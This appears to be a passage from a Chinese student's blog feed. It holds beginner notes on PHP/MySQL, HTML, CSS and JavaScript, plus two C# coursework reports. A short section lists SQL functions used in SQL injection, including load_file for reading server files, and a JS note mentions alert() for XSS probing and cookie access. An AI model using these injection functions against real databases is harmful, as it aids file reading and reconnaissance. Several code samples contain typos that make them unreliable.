class="headerlink" title="3.17 sql注入中常用的内置函数"></a>3.17 sql注入中常用的内置函数</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">database</span>()</span><br><span class="line"><span class="keyword">select</span> currebt_user</span><br><span class="line"><span class="keyword">select</span> <span class="keyword">load_file</span>(<span class="string">"路径"</span>)</span><br><span class="line"><span class="keyword">select</span> <span class="keyword">version</span>()     //数据库版本</span><br></pre></td></tr></table></figure><h4 id="3-18-php连接到数据库"><a href="#3-18-php连接到数据库" class="headerlink" title="3.18 php连接到数据库"></a>3.18 php连接到数据库</h4><p>前两天总结了php，现在再来讲讲php+mysql的应用</p><p>我认为，这个代码应该分成两个部分：</p><p>1.连接到数据库<br>2.执行SQL语句</p><p>提醒一下，不要用mysql_connect连接了，太古老了，官方文档是这样说的：从 PHP 5.5.0 起这个扩展已经被废弃，并且从 PHP 7.0.0. 开始被移除。<br>怪不得我以前照着书上的代码敲的时候不能用。。。。。。。。</p><p>mysqli连接，这个大部分是面向对象的，即最好用new来开始连接，不推荐过程化风格，虽然过程化风格跟mysql_connect很像，所以还是对php里面的类和对象有点了解比较好,想详细了解的话可以看官方文档</p><p>另外执行mysql语句命令用的是query语句执行的,而且query语句返回的是true跟false，可以用这一点去判断是否执行成功。</p><p>整个环境都是用PHPstudy搭的，数据库名称是php10，以后配置记得以下三步：数据库导入，原码导入，配置数据库文件emmmm，不多说了，还是直接上代码比较靠谱：  </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$host = <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>;</span><br><span class="line">$user = <span class="string">'root'</span>;</span><br><span class="line">$pwd = <span class="string">'root'</span>;</span><br><span class="line">$dbname = <span class="string">'php10'</span>;</span><br><span class="line"></span><br><span class="line">$db = <span class="keyword">new</span> mysqli($host,$user,$pwd,$dbname);</span><br><span class="line"><span class="keyword">if</span>($db-&gt;connect_errno!=<span class="number">0</span>)   <span class="comment">//这里的的mysqli_errno=0即连接成功，可以用var_dump函数去验证</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"连接失败！"</span>;</span><br><span class="line"><span class="keyword">echo</span> $db-&gt;connect_error;    <span class="comment">//返回错误信息</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$sql = <span class="string">"update msg set user='0verWatch' where id=1"</span>;  <span class="comment">//sql语言不分大小写</span></span><br><span class="line">$db-&gt;query(<span class="string">"SET NAMES UTF8"</span>); </span><br><span class="line">    <span class="comment">//确保数据传输也是UTF-8，防止出现乱码，可能会出现这种情况，但我发现我删除之后没影响，最好还是些写写吧，小心是UTF8没有横线</span></span><br><span class="line">$flag = $db-&gt;query($sql);      <span class="comment">//返回true跟false，查询官方文档可知</span></span><br><span class="line"><span class="keyword">if</span>($flag == <span class="keyword">true</span>)    </span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'连接成功！'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"> <span class="keyword">echo</span> <span class="string">"连接失败"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="0x03-发几句牢骚"><a href="#0x03-发几句牢骚" class="headerlink" title="0x03  发几句牢骚"></a>0x03  发几句牢骚</h2><p> 放寒假打的第一场球，就把手给折了，还好我强忍着疼痛把这篇博客给写完，果然学习才是人生第一大事。。。。。。。    </p>]]></content>
      
      <categories>
          
          <category> 编程语言 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> php </tag>
            
            <tag> sql </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>php留言板编写总结</title>
      <link href="/2018/02/02/php%20summary/"/>
      <url>/2018/02/02/php%20summary/</url>
      <content type="html"><![CDATA[<h2 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01  前言"></a>0x01  前言</h2><p>   寒假闲来无事，就随便写一个留言板来复习一下php语言  </p><a id="more"></a><h2 id="0x02-先从html语言简单说起"><a href="#0x02-先从html语言简单说起" class="headerlink" title="0x02  先从html语言简单说起"></a>0x02  先从html语言简单说起</h2><h4 id="基础的html结构："><a href="#基础的html结构：" class="headerlink" title="基础的html结构："></a>基础的html结构：</h4>   <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span>     //声明</span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">head</span>&gt;</span><span class="tag">&lt;/<span class="name">head</span>&gt;</span>  //描述网页各种属性，一般不在网页内容内显示</span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span><span class="tag">&lt;/<span class="name">body</span>&gt;</span>  //真正写内容的</span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span>//大标签</span><br></pre></td></tr></table></figure><h4 id="用到的标签"><a href="#用到的标签" class="headerlink" title="用到的标签:"></a>用到的标签:</h4><ol><li>一对的：</li></ol><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span>  //容器</span><br><span class="line"><span class="tag">&lt;<span class="name">form</span>&gt;</span><span class="tag">&lt;/<span class="name">form</span>&gt;</span>    //表格</span><br><span class="line"><span class="tag">&lt;<span class="name">textarea</span>&gt;</span><span class="tag">&lt;/<span class="name">textarea</span>&gt;</span>  //文本输入</span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">herf</span>=<span class="string">""</span>&gt;</span> <span class="tag">&lt;/<span class="name">a</span>&gt;</span>  //超链接</span><br><span class="line"><span class="tag">&lt;<span class="name">select</span>&gt;</span>     //选择项</span><br><span class="line"><span class="tag">&lt;<span class="name">option</span>&gt;</span><span class="tag">&lt;/<span class="name">option</span>&gt;</span>    //选择内容</span><br><span class="line">        <span class="tag">&lt;<span class="name">option</span>&gt;</span><span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br></pre></td></tr></table></figure><ol start="2"><li>单身狗类型的:<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">""</span> <span class="attr">value</span>=<span class="string">""</span> /&gt;</span>  //输入  type跟value属性分别是输入的类型跟名字  </span><br><span class="line">                            //type有submit，text，radio，checkbox，file等属性</span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- --&gt;</span>           //注释  </span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">image</span> <span class="attr">src</span>=<span class="string">""</span>  <span class="attr">width</span>=<span class="string">""</span> <span class="attr">height</span> =<span class="string">""</span>/&gt;</span>       //图片</span><br></pre></td></tr></table></figure></li></ol><h4 id="全局属性"><a href="#全局属性" class="headerlink" title="全局属性"></a>全局属性</h4><p> 例如id class title name等</p><h2 id="0x03-CSS"><a href="#0x03-CSS" class="headerlink" title="0x03 CSS"></a>0x03 CSS</h2><p>   感觉这一部分没什么多大作用，因为单单是用来美化的（我感觉），考虑到自己刚写博客还是总结一下我自己认为的东西吧。<br>    <strong>样式</strong>：设置字体颜色宽度背景颜色等就是样式  样式与样式之间用<strong>分号</strong>隔开，其属性用<strong>冒号</strong>隔开。。</p><h4 id="对CSS的操作"><a href="#对CSS的操作" class="headerlink" title="对CSS的操作"></a>对CSS的操作</h4><p>1.利用div标签里面的style属性去完成操作，例如：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">"color:red;"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><p>   2.在head里面写，通过style标签，例如：<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="undefined">    //div里面的内容都变成红色</span></span><br><span class="line"><span class="undefined">div&#123;</span></span><br><span class="line"><span class="undefined">color:green;</span></span><br><span class="line"><span class="undefined">   &#125;</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p>3.通过外链去实现，写link标签在head里面，注意此时不能使用style标签，因为style标签是属于html的东西</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">     <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span>  <span class="attr">type</span> = <span class="string">"text/css"</span>  <span class="attr">href</span>= <span class="string">"style.css"</span>/&gt;</span>  //最后一个属性是你对应的文件名</span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="选择器"><a href="#选择器" class="headerlink" title="选择器:"></a>选择器:</h4><p><code>&lt;div&gt;&lt;/div&gt;</code>  css文件内都是如果是div就代表全部div都改变字体大小等属性。。。</p><p> 关于选中某一部分的容器去改字体大小或颜色<br>例如:<br><code>&lt;div id=&quot;a1&quot;&gt;&lt;/div&gt;</code>,对应的css文件也要改，改成<code>#a1{}</code> 这里的#代表了是<strong>id选择器</strong><br><code>&lt;div class=&quot;a1&quot;&gt;&lt;/div&gt;</code>,对应的css文件也要改，改成<code>.a1{}</code> 这里的#代表了是<strong>类选择器</strong><br>  还有就是有一个类似C++里面的继承关系的东西，在同名不同选择器内可以在css文件内这样写：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#a1 .aa1</span><br><span class="line">&#123;</span><br><span class="line">&#125;  //id选择器的</span><br><span class="line">.a1 .aa1</span><br><span class="line">&#123;</span><br><span class="line">&#125;  //类选择器的</span><br></pre></td></tr></table></figure><h2 id="0x04-再来简单谈谈JavaScript"><a href="#0x04-再来简单谈谈JavaScript" class="headerlink" title="0x04  再来简单谈谈JavaScript"></a>0x04  再来简单谈谈JavaScript</h2><p>一般网页上的动态画面都是它来完成的</p><h4 id="可以运行的地方"><a href="#可以运行的地方" class="headerlink" title="可以运行的地方"></a>可以运行的地方</h4><ol><li>html的<code>&lt;script&gt;&lt;/script&gt;</code></li><li>html属性事件中，如<strong>onclick</strong></li><li>浏览器的<strong>console控制台</strong>     //ctf题目有些就可以利用这个点去找flag</li></ol><h4 id="JavaScript-DOM-主要是对html的操作"><a href="#JavaScript-DOM-主要是对html的操作" class="headerlink" title="JavaScript DOM   主要是对html的操作"></a>JavaScript DOM   主要是对html的操作</h4><p>1.获取html元素  函数<strong>getElementById():</strong>通过ID获取元素,例如：<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">id</span>=<span class="string">"info"</span>&gt;</span>哈哈哈<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript">x= doucument.getElementById(<span class="string">"info"</span>)</span></span><br><span class="line"><span class="javascript">alert(<span class="string">'id为info元素的文本是'</span>+x.innerHTML);    <span class="comment">//这里的innerHTML是获取元素内容，而alert()在JavaScript中可以弹出一个警告框展示信息</span></span></span><br><span class="line"><span class="undefined"> </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p>   2.修改html内容 与获取内容的前两步是一样的，例如：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">id</span>=<span class="string">"info"</span>&gt;</span>哈哈哈<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript">x= doucument.getElementById(<span class="string">"info"</span>)</span></span><br><span class="line"><span class="javascript">x.innerHTML = <span class="string">'改变的内容！'</span>;  </span></span><br><span class="line"><span class="undefined"> </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>  3.创建动态的html元素内容</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">document.write()</span><br></pre></td></tr></table></figure><p>4.增加互动元素，如：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript"><span class="function"><span class="keyword">function</span> <span class="title">changetext</span>(<span class="params">id</span>)</span></span></span><br><span class="line"><span class="undefined">&#123;</span></span><br><span class="line"><span class="javascript">   id.innerHTML=<span class="string">"谢谢！"</span>;</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span> <span class="attr">onclick</span>=<span class="string">"chagetext(this)"</span>&gt;</span>click here<span class="tag">&lt;/<span class="name">h1</span>&gt;</span>  //利用onclick</span><br></pre></td></tr></table></figure><h4 id="JavaScript-BOM-–对浏览器的操作"><a href="#JavaScript-BOM-–对浏览器的操作" class="headerlink" title="JavaScript BOM –对浏览器的操作:"></a>JavaScript BOM –对浏览器的操作:</h4><ol><li>警告用户      &nbsp;//常用于xss漏洞测试<br> 警告弹窗<strong>alert()</strong><br> 确认弹窗<strong>confirm()</strong><br> 提示弹窗<strong>prompt()</strong></li><li>获取cookie或者写入cookie<br><code>document.cookie</code>    &nbsp;&nbsp;&nbsp;//读取<br><code>document.cookie=&quot;写入值&quot;</code> &nbsp;&nbsp; //写入</li></ol><p>还有其他操作就不一一举例了 -&gt;-&gt;</p><h2 id="0x05-PHP"><a href="#0x05-PHP" class="headerlink" title="0x05      PHP"></a>0x05      PHP</h2><h4 id="环境的搭建"><a href="#环境的搭建" class="headerlink" title="环境的搭建"></a>环境的搭建</h4><pre><code>各种傻瓜式装环境谷歌一下都有</code></pre><h4 id="标记符"><a href="#标记符" class="headerlink" title="标记符"></a>标记符</h4><pre><code>`&lt;?php     ?&gt;  //在标记符之外都是可用来显示html代码的(html混写)，每句话后面都一定要记住不要忘记分号`</code></pre><h4 id="注释："><a href="#注释：" class="headerlink" title="注释："></a>注释：</h4><ol><li><code>#</code>   2. <code>//</code>  3. <code>/**/</code></li></ol><h4 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h4><p><code>$</code>开头<br><strong>注意</strong>：定义字符串与数组各有两种形式<br>字符串<code>$a=&quot;aaa&quot;   $a=&#39;aaa&#39;</code>   这里跟C++的字符与字符串定义有点区别，而且双引号考虑变量名，单引号该输出什么就输出什么<br><code>$b=[1,2,3]   $b=array(1,2,3)</code>   前面是php5.4之后数组的新写法  ，后面是传统写法<br><strong>注意</strong>数据类型的转换，无效的字符串就会变成0 例如： <code>(int)&#39;saaa&#39;=0  (int)true=1</code>等等</p><h4 id="var-dump-函数"><a href="#var-dump-函数" class="headerlink" title="var_dump()函数"></a>var_dump()函数</h4><p> <code>var_dump()</code>同时输出变量的数据类型及数据，可多个值写进，一般用来测试。。。</p><h4 id="运算符"><a href="#运算符" class="headerlink" title="运算符"></a>运算符</h4><p>其中有一个<code>.=</code> 的符号，里面的.是用来连接两个变量的符号<br>还有一些例如<code>=&gt;</code> ，<code>-&gt;</code>我认为还是比较特殊的</p><h4 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h4><p>   定义格式</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">function name()</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注意：函数里面的变量进不来也出不去</p><h4 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h4><p>   键是唯一的 ，但是值可以是多种类型的，用逗号隔开，例如可以数组套数组<code>$arr=[1,2,[1,2,3]]</code></p><p> 分索引数组与关联数组：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$arr1=[1,2,3];   //索引数组</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$arr2=[ &apos;a&apos;=&gt; 1,&apos;b&apos;=&gt; 2 ];    //关联数组这个有点类似python里边的字典，随意添加键值</span><br><span class="line">unset($arr2[&apos;b&apos;]);    //删除</span><br></pre></td></tr></table></figure><h4 id="数据的发送与接收注意点："><a href="#数据的发送与接收注意点：" class="headerlink" title="数据的发送与接收注意点："></a>数据的发送与接收注意点：</h4><p>   1.html一定要在form表单内并且要有<strong>action</strong> 与<strong>method</strong>属性<br>   2.form里面的input一定要有对应的<strong>name</strong>值<br>例如：      </p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">  <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">'test.php'</span> <span class="attr">method</span>=<span class="string">'post'</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">'text'</span> <span class="attr">name</span>=<span class="string">'aa'</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">'text'</span>  <span class="attr">name</span>=<span class="string">'bb'</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">'submit'</span> <span class="attr">value</span>=<span class="string">'提交'</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure><p>3.<strong>GET,POST,REQUEST</strong>(REQUEST方式两种都行，不过听说开发有点危险，不推荐使用)在对应的php文件里面的键名一定要对应，这两个预变量与数组的操作差不多</p><h4 id="类和对象"><a href="#类和对象" class="headerlink" title="类和对象"></a>类和对象</h4><p>个人觉得代码很少的时候，觉得这是累赘。。。。。可能开发团队大了就有些用处。。。<br>类里面的变量跟方法最好都要设置可见性，就下些什么public之类的。-&gt;详情请看官方文档</p><p>对象调用类里面的属性好像只能用<code>-&gt;</code>,看了看文档好像没有用.去连接的，这里还是和C++有点区别的，<strong>另外就是调用的时候箭头右边就不用加$了</strong>；例如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$myFoo-&gt;test();   //这里的test()是类里面的一个方法</span><br></pre></td></tr></table></figure><p>还有就是类里面的<code>$this</code> 可以在自家类的方法里面调用其他自己类的方法，这个东西千万不要忘记了<code>$</code>我就忘了很多遍<br>下面是例子：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  </span><br><span class="line">  <span class="class"><span class="keyword">class</span> <span class="title">name</span></span>&#123;</span><br><span class="line">     <span class="keyword">public</span> $a = <span class="number">0</span>;</span><br><span class="line">     <span class="keyword">public</span> $b = <span class="number">1</span>;</span><br><span class="line">     <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">a1</span><span class="params">()</span></span>&#123;</span><br><span class="line">      <span class="keyword">$this</span>-&gt;a2();</span><br><span class="line">     &#125;</span><br><span class="line">     <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">a2</span><span class="params">()</span></span>&#123;</span><br><span class="line">     <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;b;</span><br><span class="line">     &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  $n = <span class="keyword">new</span> name();  <span class="comment">//根据类实例化</span></span><br><span class="line">  $n -&gt; a1();</span><br><span class="line">   <span class="keyword">echo</span> $n-&gt;a;</span><br><span class="line">  <span class="comment">//var_dump($n);</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h4 id="魔术方法"><a href="#魔术方法" class="headerlink" title="魔术方法"></a>魔术方法</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__constuct</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">&#125;       </span><br><span class="line"><span class="comment">//哎呀其实就是构造函数。。。。</span></span><br></pre></td></tr></table></figure><h4 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h4><p>  include，include_once,require,require_once的区别：<br>  include你调用几次就加载几次，而include_once至加载一次<br> 而require跟require_once的区别同上<br> include跟require的区别就是一旦出错require会终止而include会继续执行后面的代码</p><h3 id="这几天的总结就这样吧。。明天开始捣鼓捣鼓数据库吧。。。。"><a href="#这几天的总结就这样吧。。明天开始捣鼓捣鼓数据库吧。。。。" class="headerlink" title="这几天的总结就这样吧。。明天开始捣鼓捣鼓数据库吧。。。。"></a>这几天的总结就这样吧。。明天开始捣鼓捣鼓数据库吧。。。。</h3>]]></content>
      
      <categories>
          
          <category> 编程语言 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> php </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>程序设计课 C#的作业报告四</title>
      <link href="/2018/01/28/Csharp-work4/"/>
      <url>/2018/01/28/Csharp-work4/</url>
      <content type="html"><![CDATA[<h2 id="实验四-文本编辑器"><a href="#实验四-文本编辑器" class="headerlink" title="实验四 文本编辑器"></a>实验四 文本编辑器</h2><p>   设计开发一个多文档文本编辑器，在文本编辑器，图像处理器这样的应用软件中，通常需要同时处理一个或多个文档，每<br>   <a id="more"></a></p><p>   个文档独立地执行软件所需要的功能，子窗体之间可以进行数据交互，也可以互不相关，Visual Studio开发环境就是多文档文本编辑器。</p><h5 id="1-界面设计"><a href="#1-界面设计" class="headerlink" title="1.  界面设计"></a>1.  界面设计</h5><p> <img src="https://s1.ax1x.com/2018/05/20/Cgg9sJ.png" alt="Cgg9sJ.png"></p><h5 id="2-功能实现"><a href="#2-功能实现" class="headerlink" title="2. 功能实现"></a>2. 功能实现</h5><p>  分别运行新建文档，设置字体，设置粗体，设置斜体，设置下划线，情况如下：</p><p><a href="https://imgchr.com/i/CggiZR" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/05/20/CggiZR.md.png" alt="CggiZR.md.png"></a></p><h5 id="3-拓展功能"><a href="#3-拓展功能" class="headerlink" title="3. 拓展功能"></a>3. 拓展功能</h5><p>  分别对其进行颜色改变，撤回，搜索与替换的功能，居中以及右对齐运行情况如下：<br><img src="https://s1.ax1x.com/2018/05/20/CggFd1.png" alt="CggFd1.png"></p><p><img src="https://s1.ax1x.com/2018/05/20/CggkIx.png" alt="CggkIx.png"></p><h5 id="4-实验体会"><a href="#4-实验体会" class="headerlink" title="4. 实验体会"></a>4. 实验体会</h5><ol><li>这次实验深刻体会到了C#里边的某些控件的方便性，就比如这次实验里边的Richtextbox里边的各种函数，一句话的函数就可以完成撤回，剪切，复制，粘贴等功能。</li><li>更加深刻地认识到了comblebox这个控件的功能，可以利用它加载自己定义的一系列东西，还可以加载本系统已有的东西。</li><li>在拓展功能部分对于搜索字符常与替换有了更深刻地理解，了解到里面搜索是如何去搜索的，就是利用原来你搜索的字符串长度去搜索的，每次累加直到达到文本末。替换也是利用了搜索功能去查询然后再把它给换掉。</li><li>最后一次程序设计课的实验，来个总结，虽然一开始对C#毫不理解，对语法也不是很明白，但是自己一步步做的每一个实验都有所收获，不会的去百度，最后完成一个个作品，十分开心，总体上看，C#确实要比其他的图形界面编程语言好得多，只能说它的工具确实太强大了。</li></ol><h5 id="代码下载地址：多文档编辑器"><a href="#代码下载地址：多文档编辑器" class="headerlink" title="代码下载地址：多文档编辑器"></a>代码下载地址：<a href="http://download.csdn.net/download/u011377996/10228652" target="_blank" rel="noopener">多文档编辑器</a></h5><h5 id="仅是为了记录自己的学习过程，请大佬们勿喷！！"><a href="#仅是为了记录自己的学习过程，请大佬们勿喷！！" class="headerlink" title="仅是为了记录自己的学习过程，请大佬们勿喷！！"></a>仅是为了记录自己的学习过程，请大佬们勿喷！！</h5>]]></content>
      
      <categories>
          
          <category> 编程语言 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C# </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>程序设计课 C#的作业报告三</title>
      <link href="/2018/01/28/Csharp-work3/"/>
      <url>/2018/01/28/Csharp-work3/</url>
      <content type="html"><![CDATA[<h2 id="实验三-拼图游戏"><a href="#实验三-拼图游戏" class="headerlink" title="实验三 拼图游戏"></a>实验三 拼图游戏</h2><p>   设计开发一个趣味拼图游戏，其功能是对加载的图片进行分割并随机加载到图片框矩阵中，用户使用鼠标拖动图片框中的<br>   <a id="more"></a></p><p>   图片进行拼图，系统能够自动判断拼图是否成功并进行提示。</p><h5 id="1-界面设计"><a href="#1-界面设计" class="headerlink" title="1.  界面设计"></a>1.  界面设计</h5><p><img src="https://s1.ax1x.com/2018/05/20/Cgc6rd.png" alt="Cgc6rd.png"></p><h5 id="2-功能实现"><a href="#2-功能实现" class="headerlink" title="2. 功能实现"></a>2. 功能实现</h5><p> （1）按下查看原图按钮，结果如下：<br><img src="https://s1.ax1x.com/2018/05/20/CgcLaq.png" alt="CgcLaq.png"></p><p>（2）按下试玩新图按钮，导进一张新的图片，结果如下：<br><img src="https://s1.ax1x.com/2018/05/20/CgcjiV.png" alt="CgcjiV.png"></p><p>（3）按下切换图片按钮，结果如下：<br><img src="https://s1.ax1x.com/2018/05/20/CgcvGT.png" alt="CgcvGT.png"></p><p>（4）按下图片重排按钮功能就不一一介绍啦。。。。。</p><h5 id="3-拓展功能"><a href="#3-拓展功能" class="headerlink" title="3. 拓展功能"></a>3. 拓展功能</h5><ol><li><p>选择难度系数更高的分块，再点击图片重排按钮，结果如下：<br><img src="https://s1.ax1x.com/2018/05/20/CgcxRU.png" alt="CgcxRU.png"></p></li><li><p>选择挑战模式，并选择挑战难度随即进行限时挑战，结果如下：<br><img src="https://s1.ax1x.com/2018/05/20/CggpM4.png" alt="CggpM4.png"></p></li></ol><h5 id="4-实验体会"><a href="#4-实验体会" class="headerlink" title="4. 实验体会"></a>4. 